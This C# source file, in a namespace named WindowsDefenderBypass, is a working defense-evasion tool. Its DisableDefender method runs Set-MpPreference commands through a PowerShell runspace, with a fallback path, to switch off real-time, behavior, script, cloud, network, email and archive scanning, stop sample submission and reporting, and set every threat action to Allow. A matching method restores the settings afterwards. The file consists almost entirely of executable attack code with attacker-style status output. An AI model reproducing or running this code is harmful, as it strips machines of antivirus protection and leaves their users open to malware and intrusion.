using System;
using System.Diagnostics;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace WindowsDefenderBypass
{
    public static class DefenderManager
    {
        public static void DisableDefender()
        {
            bool useRunspace = false;
            try
            {
                var testRunspace = RunspaceFactory.CreateRunspace();
                testRunspace.Dispose();
                useRunspace = true;
            }
            catch
            {
                useRunspace = false;
            }

            if (useRunspace)
            {
                try
                {
                    using (Runspace runspace = RunspaceFactory.CreateRunspace())
                    {
                        runspace.Open();
                        using (PowerShell ps = PowerShell.Create())
                        {
                            ps.Runspace = runspace;

                        ExecutePowerShellCommand(ps, "Set-MpPreference -DisableRealtimeMonitoring $true");
                        Console.WriteLine("  [+] Disabled real-time monitoring");

                        ExecutePowerShellCommand(ps, "Set-MpPreference -DisableBehaviorMonitoring $true");
                        Console.WriteLine("  [+] Disabled behavior monitoring");

                        ExecutePowerShellCommand(ps, "Set-MpPreference -DisableBlockAtFirstSeen $true");
                        Console.WriteLine("  [+] Disabled block at first seen");

                        ExecutePowerShellCommand(ps, "Set-MpPreference -DisableIOAVProtection $true");
                        Console.WriteLine("  [+] Disabled IOAV protection");

                        ExecutePowerShellCommand(ps, "Set-MpPreference -DisableScriptScanning $true");
                        Console.WriteLine("  [+] Disabled script scanning");

                        ExecutePowerShellCommand(ps, "Set-MpPreference -DisableCloudProtection $true");
                        Console.WriteLine("  [+] Disabled cloud protection");

                        ExecutePowerShellCommand(ps, "Set-MpPreference -DisableNetworkProtection $true");
                        Console.WriteLine("  [+] Disabled network protection");

                        ExecutePowerShellCommand(ps, "Set-MpPreference -SubmitSamplesConsent 2");
                        Console.WriteLine("  [+] Disabled sample submission");

                        ExecutePowerShellCommand(ps, "Set-MpPreference -MAPSReporting 0");
                        Console.WriteLine("  [+] Disabled MAPS reporting");

                        ExecutePowerShellCommand(ps, "Set-MpPreference -HighThreatDefaultAction 6 -Force");
                        ExecutePowerShellCommand(ps, "Set-MpPreference -ModerateThreatDefaultAction 6");
                        ExecutePowerShellCommand(ps, "Set-MpPreference -LowThreatDefaultAction 6");
                        ExecutePowerShellCommand(ps, "Set-MpPreference -SevereThreatDefaultAction 6");
                        Console.WriteLine("  [+] Set all threat actions to Allow");

                        ExecutePowerShellCommand(ps, "Set-MpPreference -DisableArchiveScanning $true");
                        Console.WriteLine("  [+] Disabled archive scanning");

                        ExecutePowerShellCommand(ps, "Set-MpPreference -DisableEmailScanning $true");
                        Console.WriteLine("  [+] Disabled email scanning");

                        ExecutePowerShellCommand(ps, "Set-MpPreference -DisableRemovableDriveScanning $true");
                        Console.WriteLine("  [+] Disabled removable drive scanning");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"  [!] Error in PowerShell runspace: {ex.Message}");
                    FallbackPowerShellExecution();
                }
            }
            else
            {
                FallbackPowerShellExecution();
            }
        }

        private static void ExecutePowerShellCommand(PowerShell ps, string command)
        {
            ps.Commands.Clear();
            ps.AddScript(command);
            ps.Invoke();
            if (ps.HadErrors)
            {
                foreach (ErrorRecord error in ps.Streams.Error)
                {
                    Console.WriteLine($"    [!] Warning: {error.Exception.Message}");
                }
            }
        }

        private static void FallbackPowerShellExecution()
        {
            Console.WriteLine("  [*] Using fallback PowerShell execution method...");
            string[] commands = {
                "Set-MpPreference -DisableRealtimeMonitoring $true",
                "Set-MpPreference -DisableBehaviorMonitoring $true",
                "Set-MpPreference -DisableBlockAtFirstSeen $true",
                "Set-MpPreference -DisableIOAVProtection $true",
                "Set-MpPreference -DisableScriptScanning $true",
                "Set-MpPreference -DisableCloudProtection $true",
                "Set-MpPreference -DisableNetworkProtection $true",
                "Set-MpPreference -DisableArchiveScanning $true",
                "Set-MpPreference -DisableEmailScanning $true",
                "Set-MpPreference -DisableRemovableDriveScanning $true",
                "Set-MpPreference -SubmitSamplesConsent 2",
                "Set-MpPreference -MAPSReporting 0",
                "Set-MpPreference -HighThreatDefaultAction 6 -Force",
                "Set-MpPreference -ModerateThreatDefaultAction 6",
                "Set-MpPreference -LowThreatDefaultAction 6",
                "Set-MpPreference -SevereThreatDefaultAction 6"
            };

            foreach (string cmd in commands)
            {
                PowerShellHelper.RunPowerShellCommand(cmd);
            }
            Console.WriteLine("  [+] Applied Defender bypass via PowerShell");
        }

        public static void RestoreDefender()
        {
            bool useRunspace = false;
            try
            {
                var testRunspace = RunspaceFactory.CreateRunspace();
                testRunspace.Dispose();
                useRunspace = true;
            }
            catch
            {
                useRunspace = false;
            }

            if (useRunspace)
            {
                try
                {
                    using (Runspace runspace = RunspaceFactory.CreateRunspace())
                    {
                        runspace.Open();
                        using (PowerShell ps = PowerShell.Create())
                        {
                            ps.Runspace = runspace;

                        ExecutePowerShellCommand(ps, "Set-MpPreference -DisableRealtimeMonitoring $false");
                        ExecutePowerShellCommand(ps, "Set-MpPreference -DisableBehaviorMonitoring $false");
                        ExecutePowerShellCommand(ps, "Set-MpPreference -DisableBlockAtFirstSeen $false");
                        ExecutePowerShellCommand(ps, "Set-MpPreference -DisableIOAVProtection $false");
                        ExecutePowerShellCommand(ps, "Set-MpPreference -DisableScriptScanning $false");
                        ExecutePowerShellCommand(ps, "Set-MpPreference -DisableCloudProtection $false");
                        ExecutePowerShellCommand(ps, "Set-MpPreference -DisableNetworkProtection $false");
                        ExecutePowerShellCommand(ps, "Set-MpPreference -SubmitSamplesConsent 0");
                        ExecutePowerShellCommand(ps, "Set-MpPreference -MAPSReporting 1");
                        ExecutePowerShellCommand(ps, "Set-MpPreference -HighThreatDefaultAction 1");
                        ExecutePowerShellCommand(ps, "Set-MpPreference -ModerateThreatDefaultAction 1");
                        ExecutePowerShellCommand(ps, "Set-MpPreference -LowThreatDefaultAction 1");
                        ExecutePowerShellCommand(ps, "Set-MpPreference -SevereThreatDefaultAction 1");

                            Console.WriteLine("  [+] Re-enabled Windows Defender settings");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"  [!] Error in PowerShell runspace: {ex.Message}");
                    RestoreDefenderFallback();
                }
            }
            else
            {
                RestoreDefenderFallback();
            }

            RegistryManager.RestoreDefenderViaRegistry();
        }

        private static void RestoreDefenderFallback()
        {
            Console.WriteLine("  [*] Using fallback PowerShell execution method...");
            string[] commands = {
                "Set-MpPreference -DisableRealtimeMonitoring $false",
                "Set-MpPreference -DisableBehaviorMonitoring $false",
                "Set-MpPreference -DisableBlockAtFirstSeen $false",
                "Set-MpPreference -DisableIOAVProtection $false",
                "Set-MpPreference -DisableScriptScanning $false",
                "Set-MpPreference -DisableCloudProtection $false",
                "Set-MpPreference -DisableNetworkProtection $false",
                "Set-MpPreference -SubmitSamplesConsent 0",
                "Set-MpPreference -MAPSReporting 1",
                "Set-MpPreference -HighThreatDefaultAction 1",
                "Set-MpPreference -ModerateThreatDefaultAction 1",
                "Set-MpPreference -LowThreatDefaultAction 1",
                "Set-MpPreference -SevereThreatDefaultAction 1"
            };

            foreach (string cmd in commands)
            {
                PowerShellHelper.RunPowerShellCommand(cmd);
            }
            Console.WriteLine("  [+] Re-enabled Windows Defender settings");
        }
    }
}
